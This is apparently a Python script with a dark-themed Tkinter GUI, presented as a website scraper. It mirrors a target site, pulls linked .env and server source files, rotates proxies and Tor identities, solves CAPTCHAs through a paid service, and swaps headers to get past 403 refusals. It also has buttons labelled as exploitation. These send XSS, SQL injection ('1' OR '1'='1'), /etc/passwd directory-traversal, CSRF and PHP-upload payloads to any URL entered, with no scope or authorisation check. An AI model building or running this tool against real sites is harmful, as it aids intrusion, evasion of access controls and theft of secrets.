import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Set, Dict, List
import mimetypes
import tkinter as tk
from tkinter import messagebox, ttk
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from playwright.sync_api import sync_playwright
from twocaptcha import TwoCaptcha
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from stem import Signal
from stem.control import Controller
import random
import time
import threading
import hashlib

class WebsiteScraper:
    def __init__(self, base_url: str, output_dir: str, proxies: List[str] = None, captcha_api_key: str = None):
        self.base_url = base_url
        self.output_dir = output_dir
        self.session = requests.Session()
        self.visited_urls: Set[str] = set()
        self.dirs = {
            'html': os.path.join(output_dir, 'html'),
            'css': os.path.join(output_dir, 'css'),
            'js': os.path.join(output_dir, 'js'),
            'images': os.path.join(output_dir, 'images'),
            'fonts': os.path.join(output_dir, 'fonts'),
            'json': os.path.join(output_dir, 'json'),
            'media': os.path.join(output_dir, 'media'),
            'misc': os.path.join(output_dir, 'misc'),
            'xml': os.path.join(output_dir, 'xml'),
            'pdf': os.path.join(output_dir, 'pdf'),
            'zip': os.path.join(output_dir, 'zip'),
            'doc': os.path.join(output_dir, 'doc'),
            'xls': os.path.join(output_dir, 'xls'),
            'ppt': os.path.join(output_dir, 'ppt'),
            'svg': os.path.join(output_dir, 'svg'),
            'ico': os.path.join(output_dir, 'ico'),
            'webp': os.path.join(output_dir, 'webp'),
            'txt': os.path.join(output_dir, 'txt'),
            'api': os.path.join(output_dir, 'api'),
            'server': os.path.join(output_dir, 'server'),
            'config': os.path.join(output_dir, 'config')
        }
        
        self.user_agent = UserAgent()
        self.session.headers.update({'User-Agent': self.user_agent.random})
        
        retry_strategy = Retry(
            total=5,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        
        self.proxies = proxies if proxies else []
        self.proxy_index = 0
        self.captcha_solver = TwoCaptcha(captcha_api_key) if captcha_api_key else None
        self.resource_hashes: Set[str] = set()

    def create_directories(self):
        for directory in self.dirs.values():
            os.makedirs(directory, exist_ok=True)

    def get_file_extension(self, url: str, content_type: str = None) -> str:
        ext = os.path.splitext(urlparse(url).path)[1]
        if ext:
            return ext.lower()

        if content_type:
            ext = mimetypes.guess_extension(content_type.split(';')[0].strip())
            if ext:
                return ext

        content_type_map = {
            'text/html': '.html',
            'text/css': '.css',
            'application/javascript': '.js',
            'application/json': '.json',
            'text/plain': '.txt',
            'application/xml': '.xml',
            'application/pdf': '.pdf',
            'application/zip': '.zip',
            'application/msword': '.doc',
            'application/vnd.ms-excel': '.xls',
            'application/vnd.ms-powerpoint': '.ppt',
            'image/svg+xml': '.svg',
            'image/x-icon': '.ico',
            'image/webp': '.webp'
        }
        return content_type_map.get(content_type, '.txt')

    def determine_directory(self, url: str, content_type: str = None) -> str:
        ext = self.get_file_extension(url, content_type).lower()
        
        if ext in ['.html', '.htm']:
            return self.dirs['html']
        elif ext in ['.css', '.scss', '.less']:
            return self.dirs['css']
        elif ext in ['.js', '.jsx', '.ts', '.tsx']:
            return self.dirs['js']
        elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.ico']:
            return self.dirs['images']
        elif ext in ['.woff', '.woff2', '.ttf', '.eot', '.otf']:
            return self.dirs['fonts']
        elif ext in ['.json']:
            return self.dirs['json']
        elif ext in ['.mp3', '.mp4', '.wav', '.ogg', '.webm']:
            return self.dirs['media']
        elif ext in ['.xml']:
            return self.dirs['xml']
        elif ext in ['.pdf']:
            return self.dirs['pdf']
        elif ext in ['.zip']:
            return self.dirs['zip']
        elif ext in ['.doc', '.docx']:
            return self.dirs['doc']
        elif ext in ['.xls', '.xlsx']:
            return self.dirs['xls']
        elif ext in ['.ppt', '.pptx']:
            return self.dirs['ppt']
        elif ext in ['.svg']:
            return self.dirs['svg']
        elif ext in ['.ico']:
            return self.dirs['ico']
        elif ext in ['.webp']:
            return self.dirs['webp']
        elif ext in ['.txt']:
            return self.dirs['txt']
        elif ext in ['.php', '.py', '.js', '.rb', '.java', '.go', '.sh', '.cpp', '.c', '.cs', '.pl', '.r', '.swift', '.kt', '.scala', '.groovy']:
            return self.dirs['server']
        elif ext in ['.env', '.json', '.yaml', '.yml']:
            return self.dirs['config']
        else:
            return self.dirs['misc']

    def download_file(self, url: str, directory: str = None) -> bool:
        if url in self.visited_urls:
            return False
            
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=10, proxies=self.get_proxy())
            if response.status_code == 403:
                # Try different headers to bypass 403
                headers = {
                    'User-Agent': self.user_agent.random,
                    'Referer': self.base_url,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                response = self.session.get(url, timeout=10, proxies=self.get_proxy(), headers=headers)
            
            if response.status_code != 200:
                print(f"Failed to download {url}: Status code {response.status_code}")
                return False

            content_type = response.headers.get('content-type', '').lower()
            
            if directory is None:
                directory = self.determine_directory(url, content_type)

            filename = os.path.basename(urlparse(url).path)
            if not filename:
                ext = self.get_file_extension(url, content_type)
                filename = f"file_{len(self.visited_urls)}{ext}"

            filepath = os.path.join(directory, filename)
            
            mode = 'wb' if 'text' not in content_type else 'w'
            with open(filepath, mode, encoding='utf-8' if mode == 'w' else None) as f:
                if mode == 'w':
                    f.write(response.text)
                else:
                    f.write(response.content)
                    
            print(f"Downloaded: {filename}")
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"Error downloading {url}: {e}")
            return False

    def extract_urls(self, soup: BeautifulSoup, base_url: str) -> Dict[str, List[str]]:
        urls = {
            'css': [],
            'js': [],
            'images': [],
            'fonts': [],
            'links': [],
            'xml': [],
            'pdf': [],
            'zip': [],
            'doc': [],
            'xls': [],
            'ppt': [],
            'svg': [],
            'ico': [],
            'webp': [],
            'txt': [],
            'api': [],
            'server': [],
            'config': [],
            'manifest': [],
            'license': []
        }
        
        for tag in soup.find_all('link', rel='stylesheet'):
            if href := tag.get('href'):
                urls['css'].append(urljoin(base_url, href))
                
        for style in soup.find_all('style'):
            imports = re.findall(r'@import\s+[\'"]([^\'"]+)[\'"]', style.string or '')
            urls['css'].extend([urljoin(base_url, url) for url in imports])
                
        for tag in soup.find_all('script', src=True):
            urls['js'].append(urljoin(base_url, tag['src']))
            
        for tag in soup.find_all(['img', 'picture', 'source']):
            if src := tag.get('src'):
                urls['images'].append(urljoin(base_url, src))
            if srcset := tag.get('srcset'):
                for src in srcset.split(','):
                    url = src.strip().split(' ')[0]
                    urls['images'].append(urljoin(base_url, url))
                    
        for style in soup.find_all('style'):
            if style.string:
                fonts = re.findall(r'url\([\'"]?([^\'"]+?\.(?:woff2?|ttf|eot|otf))[\'"]?\)', style.string)
                urls['fonts'].extend([urljoin(base_url, url) for url in fonts])
                
        for tag in soup.find_all('a', href=True):
            href = tag['href']
            if href.startswith(base_url) or not urlparse(href).netloc:
                urls['links'].append(urljoin(base_url, href))
                
        for tag in soup.find_all('link', href=True):
            if 'xml' in tag.get('type', ''):
                urls['xml'].append(urljoin(base_url, tag['href']))
                
        for tag in soup.find_all('a', href=True):
            href = tag['href']
            if href.endswith('.pdf'):
                urls['pdf'].append(urljoin(base_url, href))
            elif href.endswith('.zip'):
                urls['zip'].append(urljoin(base_url, href))
            elif href.endswith('.doc') or href.endswith('.docx'):
                urls['doc'].append(urljoin(base_url, href))
            elif href.endswith('.xls') or href.endswith('.xlsx'):
                urls['xls'].append(urljoin(base_url, href))
            elif href.endswith('.ppt') or href.endswith('.pptx'):
                urls['ppt'].append(urljoin(base_url, href))
            elif href.endswith('.svg'):
                urls['svg'].append(urljoin(base_url, href))
            elif href.endswith('.ico'):
                urls['ico'].append(urljoin(base_url, href))
            elif href.endswith('.webp'):
                urls['webp'].append(urljoin(base_url, href))
            elif href.endswith('.txt'):
                urls['txt'].append(urljoin(base_url, href))
            elif href.endswith('.php') or href.endswith('.py') or href.endswith('.js') or href.endswith('.rb') or href.endswith('.java') or href.endswith('.go') or href.endswith('.sh') or href.endswith('.cpp') or href.endswith('.c') or href.endswith('.cs') or href.endswith('.pl') or href.endswith('.r') or href.endswith('.swift') or href.endswith('.kt') or href.endswith('.scala') or href.endswith('.groovy'):
                urls['server'].append(urljoin(base_url, href))
            elif href.endswith('.env') or href.endswith('.json') or href.endswith('.yaml') or href.endswith('.yml'):
                urls['config'].append(urljoin(base_url, href))
                
        # Detect API endpoints
        for tag in soup.find_all('a', href=True):
            href = tag['href']
            if href.startswith('/api/') or href.startswith('/v1/') or href.startswith('/v2/') or href.startswith('/v3/'):
                urls['api'].append(urljoin(base_url, href))
        
        # Detect manifest.json
        for tag in soup.find_all('link', href=True):
            if tag.get('rel') == ['manifest']:
                urls['manifest'].append(urljoin(base_url, tag['href']))
        
        # Detect license files referenced in comments
        for tag in soup.find_all('script', src=True):
            js_url = urljoin(base_url, tag['src'])
            js_response = self.session.get(js_url, proxies=self.get_proxy())
            if js_response.status_code == 200:
                license_matches = re.findall(r'LICENSE\.txt', js_response.text)
                for match in license_matches:
                    license_url = urljoin(js_url, match)
                    urls['license'].append(license_url)
        
        return urls

    def scrape_page(self, url: str, download_linked_pages: bool = False) -> None:
        try:
            response = self.session.get(url, proxies=self.get_proxy())
            soup = BeautifulSoup(response.text, 'html.parser')
            
            page_name = os.path.basename(urlparse(url).path) or 'index.html'
            with open(os.path.join(self.dirs['html'], page_name), 'w', encoding='utf-8') as f:
                f.write(response.text)
            
            urls = self.extract_urls(soup, url)
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for category, url_list in urls.items():
                    if category != 'links':
                        for url in url_list:
                            futures.append(executor.submit(self.download_file, url))
                
                for future in as_completed(futures):
                    future.result()
                
                if download_linked_pages:
                    for link in urls['links']:
                        if link not in self.visited_urls:
                            executor.submit(self.scrape_page, link, False)
                            
        except Exception as e:
            print(f"Error scraping {url}: {e}")

    def scrape(self, download_linked_pages: bool = False):
        print(f"Starting to scrape {self.base_url}")
        self.create_directories()
        self.scrape_page(self.base_url, download_linked_pages)
        print(f"\nScraping complete. Files saved in {self.output_dir}")
        print(f"Total files downloaded: {len(self.visited_urls)}")

    def get_proxy(self):
        if self.proxies:
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return {'http': proxy, 'https': proxy}
        return None

    def download_with_playwright(self, url: str, directory: str = None) -> bool:
        if url in self.visited_urls:
            return False
        
        self.visited_urls.add(url)
        
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(user_agent=self.user_agent.random)
                page = context.new_page()
                page.goto(url)
                
                content = page.content()
                content_type = page.evaluate("document.contentType")
                
                browser.close()
                
                if directory is None:
                    directory = self.determine_directory(url, content_type)

                filename = os.path.basename(urlparse(url).path)
                if not filename:
                    ext = self.get_file_extension(url, content_type)
                    filename = f"file_{len(self.visited_urls)}{ext}"

                filepath = os.path.join(directory, filename)
                
                mode = 'wb' if 'text' not in content_type else 'w'
                with open(filepath, mode, encoding='utf-8' if mode == 'w' else None) as f:
                    if mode == 'w':
                        f.write(content)
                    else:
                        f.write(content.encode('utf-8'))
                        
                print(f"Downloaded: {filename}")
                return True
                
        except Exception as e:
            print(f"Error downloading {url}: {e}")
            return False

    def solve_captcha(self, page):
        if self.captcha_solver:
            captcha_element = page.query_selector('img[alt="captcha"]')
            if captcha_element:
                captcha_url = captcha_element.get_attribute('src')
                captcha_response = self.captcha_solver.solve_captcha(captcha_url)
                if captcha_response:
                    page.fill('input[name="captcha"]', captcha_response)
                    page.click('button[type="submit"]')
                    return True
        return False

    def change_tor_ip(self):
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='your_password')
            controller.signal(Signal.NEWNYM)

    def check_resource_hash(self, content: bytes) -> bool:
        content_hash = hashlib.md5(content).hexdigest()
        if content_hash in self.resource_hashes:
            return False
        self.resource_hashes.add(content_hash)
        return True

    def download_file_with_hash(self, url: str, directory: str = None) -> bool:
        if url in self.visited_urls:
            return False
            
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=10, proxies=self.get_proxy())
            if response.status_code == 403:
                # Try different headers to bypass 403
                headers = {
                    'User-Agent': self.user_agent.random,
                    'Referer': self.base_url,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                response = self.session.get(url, timeout=10, proxies=self.get_proxy(), headers=headers)
            
            if response.status_code != 200:
                print(f"Failed to download {url}: Status code {response.status_code}")
                return False

            content_type = response.headers.get('content-type', '').lower()
            
            if directory is None:
                directory = self.determine_directory(url, content_type)

            filename = os.path.basename(urlparse(url).path)
            if not filename:
                ext = self.get_file_extension(url, content_type)
                filename = f"file_{len(self.visited_urls)}{ext}"

            filepath = os.path.join(directory, filename)
            
            mode = 'wb' if 'text' not in content_type else 'w'
            with open(filepath, mode, encoding='utf-8' if mode == 'w' else None) as f:
                if mode == 'w':
                    f.write(response.text)
                else:
                    f.write(response.content)
                    
            print(f"Downloaded: {filename}")
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"Error downloading {url}: {e}")
            return False

    def submit_form(self, url: str, form_data: Dict[str, str]) -> bool:
        try:
            response = self.session.post(url, data=form_data, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"Form submitted successfully to {url}")
                return True
            else:
                print(f"Failed to submit form to {url}: Status code {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error submitting form to {url}: {e}")
            return False

    def test_xss(self, url: str, payload: str) -> bool:
        try:
            response = self.session.get(url, params={'q': payload}, proxies=self.get_proxy())
            if payload in response.text:
                print(f"XSS vulnerability detected at {url}")
                self.exploit_xss(url, payload)
                return True
            else:
                print(f"No XSS vulnerability detected at {url}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error testing XSS at {url}: {e}")
            return False

    def exploit_xss(self, url: str, payload: str):
        try:
            response = self.session.get(url, params={'q': payload}, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"XSS exploit successful at {url}")
            else:
                print(f"XSS exploit failed at {url}: Status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error exploiting XSS at {url}: {e}")

    def test_sql_injection(self, url: str, payload: str) -> bool:
        try:
            response = self.session.get(url, params={'id': payload}, proxies=self.get_proxy())
            if "error in your SQL syntax" in response.text:
                print(f"SQL injection vulnerability detected at {url}")
                self.exploit_sql_injection(url, payload)
                return True
            else:
                print(f"No SQL injection vulnerability detected at {url}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error testing SQL injection at {url}: {e}")
            return False

    def exploit_sql_injection(self, url: str, payload: str):
        try:
            response = self.session.get(url, params={'id': payload}, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"SQL injection exploit successful at {url}")
            else:
                print(f"SQL injection exploit failed at {url}: Status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error exploiting SQL injection at {url}: {e}")

    def test_directory_traversal(self, url: str, payload: str) -> bool:
        try:
            response = self.session.get(url, params={'file': payload}, proxies=self.get_proxy())
            if "root:x:" in response.text:
                print(f"Directory traversal vulnerability detected at {url}")
                self.exploit_directory_traversal(url, payload)
                return True
            else:
                print(f"No directory traversal vulnerability detected at {url}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error testing directory traversal at {url}: {e}")
            return False

    def exploit_directory_traversal(self, url: str, payload: str):
        try:
            response = self.session.get(url, params={'file': payload}, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"Directory traversal exploit successful at {url}")
            else:
                print(f"Directory traversal exploit failed at {url}: Status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error exploiting directory traversal at {url}: {e}")

    def test_csrf(self, url: str, payload: str) -> bool:
        try:
            response = self.session.post(url, data={'csrf_token': payload}, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"CSRF vulnerability detected at {url}")
                self.exploit_csrf(url, payload)
                return True
            else:
                print(f"No CSRF vulnerability detected at {url}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error testing CSRF at {url}: {e}")
            return False

    def exploit_csrf(self, url: str, payload: str):
        try:
            response = self.session.post(url, data={'csrf_token': payload}, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"CSRF exploit successful at {url}")
            else:
                print(f"CSRF exploit failed at {url}: Status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error exploiting CSRF at {url}: {e}")

    def test_file_upload(self, url: str, file_path: str) -> bool:
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = self.session.post(url, files=files, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"File upload vulnerability detected at {url}")
                self.exploit_file_upload(url, file_path)
                return True
            else:
                print(f"No file upload vulnerability detected at {url}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error testing file upload at {url}: {e}")
            return False

    def exploit_file_upload(self, url: str, file_path: str):
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = self.session.post(url, files=files, proxies=self.get_proxy())
            if response.status_code == 200:
                print(f"File upload exploit successful at {url}")
            else:
                print(f"File upload exploit failed at {url}: Status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error exploiting file upload at {url}: {e}")

class ScraperUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Website Scraper")
        self.root.configure(bg='#2e2e2e')
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TLabel', background='#2e2e2e', foreground='#ffffff')
        self.style.configure('TButton', background='#4a4a4a', foreground='#ffffff', padding=5)
        self.style.configure('TCheckbutton', background='#2e2e2e', foreground='#ffffff')
        
        self.url_label = ttk.Label(root, text="Website URL:")
        self.url_label.pack(pady=5)
        
        self.url_entry = ttk.Entry(root, width=50)
        self.url_entry.pack(pady=5)
        
        self.scrape_data_var = tk.BooleanVar()
        self.xss_check_var = tk.BooleanVar()
        self.sql_check_var = tk.BooleanVar()
        self.csrf_check_var = tk.BooleanVar()
        
        self.scrape_data_check = ttk.Checkbutton(root, text="Scrape Data", variable=self.scrape_data_var)
        self.scrape_data_check.pack(pady=5)
        
        self.xss_check = ttk.Checkbutton(root, text="XSS Check", variable=self.xss_check_var)
        self.xss_check.pack(pady=5)
        
        self.sql_check = ttk.Checkbutton(root, text="SQL Check", variable=self.sql_check_var)
        self.sql_check.pack(pady=5)
        
        self.csrf_check = ttk.Checkbutton(root, text="CSRF Check", variable=self.csrf_check_var)
        self.csrf_check.pack(pady=5)
        
        self.exploit_frame = ttk.Frame(root)
        self.exploit_frame.pack(pady=10)
        
        self.xss_exploit_button = ttk.Button(self.exploit_frame, text="XSS Exploitation", command=self.exploit_xss)
        self.xss_exploit_button.pack(side=tk.LEFT, padx=5)
        
        self.sql_exploit_button = ttk.Button(self.exploit_frame, text="SQL Injection Exploitation", command=self.exploit_sql_injection)
        self.sql_exploit_button.pack(side=tk.LEFT, padx=5)
        
        self.csrf_exploit_button = ttk.Button(self.exploit_frame, text="CSRF Exploitation", command=self.exploit_csrf)
        self.csrf_exploit_button.pack(side=tk.LEFT, padx=5)
        
        self.dir_traversal_exploit_button = ttk.Button(self.exploit_frame, text="Directory Traversal Exploitation", command=self.exploit_directory_traversal)
        self.dir_traversal_exploit_button.pack(side=tk.LEFT, padx=5)
        
        self.file_upload_exploit_button = ttk.Button(self.exploit_frame, text="File Upload Exploitation", command=self.exploit_file_upload)
        self.file_upload_exploit_button.pack(side=tk.LEFT, padx=5)
        
        self.scrape_button = ttk.Button(root, text="Start Scraping", command=self.start_scraping)
        self.scrape_button.pack(pady=10)
        
        self.output_text = tk.Text(root, height=10, width=50, bg='#1e1e1e', fg='#ffffff')
        self.output_text.pack(pady=10)
        
    def start_scraping(self):
        website_url = self.url_entry.get()
        if not website_url:
            messagebox.showerror("Error", "Please enter a website URL.")
            return
        
        try:
            parsed_url = urlparse(website_url)
            if not all([parsed_url.scheme, parsed_url.netloc]):
                messagebox.showerror("Error", "Not a valid URL.")
                return
        except ValueError:
            messagebox.showerror("Error", "Not a valid URL.")
            return
        
        website_name = parsed_url.netloc.split('.')[-2]
        output_directory = f"{website_name}_website_files"
        scraper = WebsiteScraper(website_url, output_directory)
        
        self.output_text.insert(tk.END, f"Starting to scrape {website_url}\n")
        self.root.update()
        
        try:
            if self.scrape_data_var.get():
                scraper.scrape(download_linked_pages=True)
                self.output_text.insert(tk.END, f"\nScraping complete. Files saved in {output_directory}\n")
                self.output_text.insert(tk.END, f"Total files downloaded: {len(scraper.visited_urls)}\n")
            
            if self.xss_check_var.get():
                xss_result = scraper.test_xss(website_url, "<script>alert('XSS')</script>")
                self.output_text.insert(tk.END, f"XSS Check: {'Vulnerable' if xss_result else 'Not Vulnerable'}\n")
            
            if self.sql_check_var.get():
                sql_result = scraper.test_sql_injection(website_url, "1' OR '1'='1")
                self.output_text.insert(tk.END, f"SQL Check: {'Vulnerable' if sql_result else 'Not Vulnerable'}\n")
            
            if self.csrf_check_var.get():
                csrf_result = scraper.test_csrf(website_url, "invalid_csrf_token")
                self.output_text.insert(tk.END, f"CSRF Check: {'Vulnerable' if csrf_result else 'Not Vulnerable'}\n")
            
        except Exception as e:
            self.output_text.insert(tk.END, f"Error: {e}\n")

    def exploit_xss(self):
        website_url = self.url_entry.get()
        if not website_url:
            messagebox.showerror("Error", "Please enter a website URL.")
            return
        scraper = WebsiteScraper(website_url, "output_directory")
        scraper.exploit_xss(website_url, "<script>alert('XSS')</script>")

    def exploit_sql_injection(self):
        website_url = self.url_entry.get()
        if not website_url:
            messagebox.showerror("Error", "Please enter a website URL.")
            return
        scraper = WebsiteScraper(website_url, "output_directory")
        scraper.exploit_sql_injection(website_url, "1' OR '1'='1")

    def exploit_csrf(self):
        website_url = self.url_entry.get()
        if not website_url:
            messagebox.showerror("Error", "Please enter a website URL.")
            return
        scraper = WebsiteScraper(website_url, "output_directory")
        scraper.exploit_csrf(website_url, "invalid_csrf_token")

    def exploit_directory_traversal(self):
        website_url = self.url_entry.get()
        if not website_url:
            messagebox.showerror("Error", "Please enter a website URL.")
            return
        scraper = WebsiteScraper(website_url, "output_directory")
        scraper.exploit_directory_traversal(website_url, "../../../../etc/passwd")

    def exploit_file_upload(self):
        website_url = self.url_entry.get()
        if not website_url:
            messagebox.showerror("Error", "Please enter a website URL.")
            return
        scraper = WebsiteScraper(website_url, "output_directory")
        scraper.exploit_file_upload(website_url, "malicious_file.php")

if __name__ == "__main__":
    root = tk.Tk()
    app = ScraperUI(root)
    root.mainloop()